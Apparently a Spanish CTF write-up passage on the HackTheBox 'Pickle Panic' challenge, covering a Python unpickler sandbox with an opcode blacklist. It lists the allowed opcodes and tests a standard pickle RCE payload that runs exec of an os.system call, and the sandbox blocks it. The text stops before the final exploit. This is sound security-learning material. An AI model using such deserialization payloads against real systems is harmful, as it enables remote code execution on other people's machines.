@@ -1,0 +1,344 @@
+<!doctype html><html lang="es"><head><title>Pickle Panic | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="`pickle` _internals_. Jaula de Python"><meta itemprop="description" content="`pickle` _internals_. Jaula de Python"><meta name="twitter:card" content="`pickle` _internals_. Jaula de Python"><meta name="twitter:description" content="`pickle` _internals_. Jaula de Python"><meta property="og:description" content="`pickle` _internals_. Jaula de Python"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/misc.png"><meta name="twitter:image" content="https://7rocky.github.io/images/misc.png"><meta property="og:image" content="https://7rocky.github.io/images/misc.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Pickle Panic"><meta property="twitter:title" content="Pickle Panic"><meta property="og:title" content="Pickle Panic"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/misc/pickle-panic/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/misc/pickle-panic/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- MISC</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/misc/pickle-panic/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/misc/pickle-panic/&amp;text=Pickle%20Panic" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/misc/pickle-panic/&amp;title=Pickle%20Panic" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Pickle Panic</h1><p class="mb4 f6 dib tracked">9 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#pickle-_internals_"><code>pickle</code> <em>internals</em></a><ul><li><a href="#pruebas">Pruebas</a></li><li><a href="#limitaciones">Limitaciones</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#el-truco">El truco</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona este <em>script</em> en Python que se ejecuta en la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>
+
+<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span>
+<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">pickletools</span>
+<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">io</span>
+<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span>
+
+<span class="mtk1">BLACKLIST_OPCODES</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk4">"BUILD"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"SETITEM"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"SETITEMS"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"DICT"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"EMPTY_DICT"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"INST"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"OBJ"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"NEWOBJ"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"EXT1"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"EXT2"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"EXT4"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"EMPTY_SET"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"ADDITEMS"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"FROZENSET"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"NEWOBJ_EX"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"FRAME"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"BYTEARRAY8"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"NEXT_BUFFER"</span><span class="mtk1">,</span>
+<span class="mtk1">    </span><span class="mtk4">"READONLY_BUFFER"</span><span class="mtk1">,</span>
+<span class="mtk1">}</span>
+
+<span class="mtk1">module</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">type</span><span class="mtk1">(</span><span class="mtk1">__builtins__</span><span class="mtk1">)</span>
+<span class="mtk1">empty</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">module</span><span class="mtk1">(</span><span class="mtk4">"empty"</span><span class="mtk1">)</span>
+<span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">modules</span><span class="mtk1">[</span><span class="mtk4">"empty"</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">empty</span>
+
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">MyUnpickler</span><span class="mtk1">(</span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8 mtku">Unpickler</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">find_class</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">, </span><span class="mtk9 mtki">module</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">module</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"empty"</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk9 mtki">name</span><span class="mtk1">.count(</span><span class="mtk4">"."</span><span class="mtk1">) </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk4">"setattr"</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk9 mtki">name</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk4">"setitem"</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk9 mtki">name</span><span class="mtk1">:</span>  
+<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">super</span><span class="mtk1">().</span><span class="mtk8">find_class</span><span class="mtk1">(</span><span class="mtk9 mtki">module</span><span class="mtk1">, </span><span class="mtk9 mtki">name</span><span class="mtk1">)</span>
+<span class="mtk1">        </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk5">raise</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8 mtku">UnpicklingError</span><span class="mtk1">(</span><span class="mtk4">"No :("</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">check</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> (</span>
+<span class="mtk1">        </span><span class="mtk8">all</span><span class="mtk1">(</span>
+<span class="mtk1">            </span><span class="mtk1">opcode</span><span class="mtk1">.</span><span class="mtk1">name</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">BLACKLIST_OPCODES</span>
+<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">opcode</span><span class="mtk1">, </span><span class="mtk1">_</span><span class="mtk1">, </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">pickletools</span><span class="mtk1">.</span><span class="mtk8">genops</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">)</span>
+<span class="mtk1">        )</span>
+<span class="mtk1">        </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">) </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">400</span>
+<span class="mtk1">    )</span>
+
+
+<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"__main__"</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">.</span><span class="mtk8">fromhex</span><span class="mtk1">(</span><span class="mtk8">input</span><span class="mtk1">(</span><span class="mtk4">"Enter your hex-encoded pickle data: "</span><span class="mtk1">))</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">check</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">MyUnpickler</span><span class="mtk1">(</span><span class="mtk8 mtku">io</span><span class="mtk1">.</span><span class="mtk8 mtku">BytesIO</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">)).</span><span class="mtk8">load</span><span class="mtk1">()</span>
+<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"Result: </span><span class="mtk6">{</span><span class="mtk1">result</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">"Check failed :("</span><span class="mtk1">)</span>
+</code></pre></div><p>También tenemos un <code>Dockerfile</code> con una versión específica de Python:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> python@sha256:4949a0cd8c491c3ab21132533a487dbe8fb</span><span class="mtk1">6dae586b667ed4b3d19c8b127187e</span>  
+<span class="mtk5">RUN</span><span class="mtk1"> apk add --no-cache socat</span>
+<span class="mtk5">RUN</span><span class="mtk1"> adduser --disabled-password --no-create-home pick</span><span class="mtk1">lepanic</span>
+<span class="mtk5">COPY</span><span class="mtk1"> challenge /challenge/</span>
+<span class="mtk5">WORKDIR</span><span class="mtk1"> /challenge</span>
+<span class="mtk5">EXPOSE</span><span class="mtk1"> 1337</span>
+<span class="mtk5">ENTRYPOINT</span><span class="mtk1"> [</span><span class="mtk4">"./entrypoint.sh"</span><span class="mtk1">]</span>
+</code></pre></div><h2 id="pickle-_internals_"><code>pickle</code> <em>internals</em></h2><p>Como se puede ver, el <em>script</em> nos permite ingresar un objeto serializado con <code>pickle</code> que será deserializado posteriormente. Sin embargo, hay una clase personalizada <code>MyUnpickler</code> que sobrescribe el funcionamiento de <code>pickle</code> para deshabilitar algunas instrucciones <em>opcode</em> (<code>BLACKLIST_OPCODES</code>).</p><p>Hay una gran cantidad de <a href="https://github.com/python/cpython/blob/main/Lib/pickletools.py"><em>opcodes</em></a>. Podemos tomar la lista completa y encontrar las que están permitidas. Usaremos el contenedor Docker para trabajar con la misma versión de Python que la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> ps -a
+CONTAINER ID   IMAGE              COMMAND             CREATED         STATUS         PORTS                    NAMES
+c81c7ed47fc8   misc_picklepanic   "./entrypoint.sh"   2 minutes ago   Up 2 minutes   0.0.0.0:1337-&gt;1337/tcp   goofy_hypatia
+
+<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> exec -it c81 sh
+/challenge # python3 --version
+Python 3.10.11
+/challenge # python3 -i challenge.py
+Enter your hex-encoded pickle data: asdf
+Traceback (most recent call last):
+  File "/challenge/challenge.py", line 54, in &lt;module&gt;
+    data = bytes.fromhex(input("Enter your hex-encoded pickle data: "))
+ValueError: non-hexadecimal number found in fromhex() arg at position 1
+&gt;&gt;&gt; BLACKLIST_OPCODES
+{'NEXT_BUFFER', 'EXT4', 'BYTEARRAY8', 'SETITEM', 'SETITEMS', 'DICT', 'BUILD', 'FRAME', 'EXT1', 'EMPTY_DICT', 'FROZENSET', 'READONLY_BUFFER', 'OBJ', 'NEWOBJ_EX', 'INST', 'EMPTY_SET', 'NEWOBJ', 'ADDITEMS', 'EXT2'}
+&gt;&gt;&gt; ALL_OPCODES = {'MARK', 'STOP', 'POP', 'POP_MARK', 'DUP', 'FLOAT', 'INT', 'BININT', 'BININT1', 'LONG', 'BININT2', 'NONE', 'PERSID', 'BINPERSID', 'REDUCE', 'STRING', 'BINSTRING', 'SHORT_BINSTRING', 'UNICODE', 'BINUNICODE', 'APPEND', 'BUILD', 'GLOBAL', 'DICT', 'EMPTY_DICT', 'APPENDS', 'GET', 'BINGET', 'INST', 'LONG_BINGET', 'LIST', 'EMPTY_LIST', 'OBJ', 'PUT', 'BINPUT', 'LONG_BINPUT', 'SETITEM', 'TUPLE', 'EMPTY_TUPLE', 'SETITEMS', 'BINFLOAT', 'PROTO', 'NEWOBJ', 'EXT1', 'EXT2', 'EXT4', 'TUPLE1', 'TUPLE2', 'TUPLE3', 'NEWTRUE', 'NEWFALSE', 'LONG1', 'LONG4', 'BINBYTES', 'SHORT_BINBYTES', 'SHORT_BINUNICODE', 'BINUNICODE8', 'BINBYTES8', 'EMPTY_SET', 'ADDITEMS', 'FROZENSET', 'NEWOBJ_EX', 'STACK_GLOBAL', 'MEMOIZE', 'FRAME', 'BYTEARRAY8', 'NEXT_BUFFER', 'READONLY_BUFFER'}  
+&gt;&gt;&gt; ALL_OPCODES.difference(BLACKLIST_OPCODES)
+{'GET', 'STACK_GLOBAL', 'BININT2', 'INT', 'BINSTRING', 'UNICODE', 'NEWTRUE', 'REDUCE', 'NEWFALSE', 'STOP', 'TUPLE', 'EMPTY_LIST', 'LONG_BINPUT', 'SHORT_BINBYTES', 'BINPUT', 'APPEND', 'TUPLE1', 'NONE', 'SHORT_BINUNICODE', 'POP', 'GLOBAL', 'TUPLE2', 'BINUNICODE8', 'DUP', 'POP_MARK', 'BININT1', 'FLOAT', 'LONG', 'PERSID', 'LONG_BINGET', 'LIST', 'TUPLE3', 'BININT', 'BINUNICODE', 'PROTO', 'STRING', 'BINPERSID', 'PUT', 'EMPTY_TUPLE', 'APPENDS', 'SHORT_BINSTRING', 'LONG4', 'LONG1', 'BINGET', 'BINFLOAT', 'MARK', 'BINBYTES', 'MEMOIZE', 'BINBYTES8'}
+&gt;&gt;&gt; print('\n'.join(ALL_OPCODES.difference(BLACKLIST_OPCODES)))
+GET
+STACK_GLOBAL
+BININT2
+INT
+BINSTRING
+UNICODE
+NEWTRUE
+REDUCE
+NEWFALSE
+STOP
+TUPLE
+EMPTY_LIST
+LONG_BINPUT
+SHORT_BINBYTES
+BINPUT
+APPEND
+TUPLE1
+NONE
+SHORT_BINUNICODE
+POP
+GLOBAL
+TUPLE2
+BINUNICODE8
+DUP
+POP_MARK
+BININT1
+FLOAT
+LONG
+PERSID
+LONG_BINGET
+LIST
+TUPLE3
+BININT
+BINUNICODE
+PROTO
+STRING
+BINPERSID
+PUT
+EMPTY_TUPLE
+APPENDS
+SHORT_BINSTRING
+LONG4
+LONG1
+BINGET
+BINFLOAT
+MARK
+BINBYTES
+MEMOIZE
+BINBYTES8
+</code></pre></div><h3 id="pruebas">Pruebas</h3><p>Solo para probar, analicemos un <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md"><em>exploit</em> de RCE típico de <code>pickle</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; class Evil():
+...     def __reduce__(self):
+...         return exec, ('import os; os.system("whoami")', )
+...
+&gt;&gt;&gt; data = pickle.dumps(Evil())
+&gt;&gt;&gt; data
+b'\x80\x04\x95:\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c\x1eimport os; os.system("whoami")\x94\x85\x94R\x94.'  
+&gt;&gt;&gt; pickletools.dis(data)
+    0: \x80 PROTO      4
+    2: \x95 FRAME      58
+   11: \x8c SHORT_BINUNICODE 'builtins'
+   21: \x94 MEMOIZE    (as 0)
+   22: \x8c SHORT_BINUNICODE 'exec'
+   28: \x94 MEMOIZE    (as 1)
+   29: \x93 STACK_GLOBAL
+   30: \x94 MEMOIZE    (as 2)
+   31: \x8c SHORT_BINUNICODE 'import os; os.system("whoami")'
+   63: \x94 MEMOIZE    (as 3)
+   64: \x85 TUPLE1
+   65: \x94 MEMOIZE    (as 4)
+   66: R    REDUCE
+   67: \x94 MEMOIZE    (as 5)
+   68: .    STOP
+highest protocol among opcodes = 4
+&gt;&gt;&gt; check(data)
+False
+&gt;&gt;&gt; MyUnpickler(io.BytesIO(data)).load()
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+  File "/challenge/challenge.py", line 40, in find_class
+    raise pickle.UnpicklingError("No :(")
+_pickle.UnpicklingError: No :(
+</code></pre></div><p>No iba a ser tan fácil.De hecho, hay varios protocolos de <code>pickle</code> (el <code>4</code> es el que se usa por defecto). El protocolo <code>0</code> es más sencillo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; data = pickle.dumps(Evil(), protocol=0)
+&gt;&gt;&gt; data
+b'c__builtin__\nexec\np0\n(Vimport os; os.system("whoami")\np1\ntp2\nRp3\n.'  
+&gt;&gt;&gt; pickletools.dis(data)
+    0: c    GLOBAL     '__builtin__ exec'
+   18: p    PUT        0
+   21: (    MARK
+   22: V        UNICODE    'import os; os.system("whoami")'
+   54: p        PUT        1
+   57: t        TUPLE      (MARK at 21)
+   58: p    PUT        2
+   61: R    REDUCE
+   62: p    PUT        3
+   65: .    STOP
+highest protocol among opcodes = 0
+&gt;&gt;&gt; check(data)
+True
+&gt;&gt;&gt; MyUnpickler(io.BytesIO(data)).load()
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+  File "/challenge/challenge.py", line 40, in find_class
+    raise pickle.UnpicklingError("No :(")
+_pickle.UnpicklingError: No :(
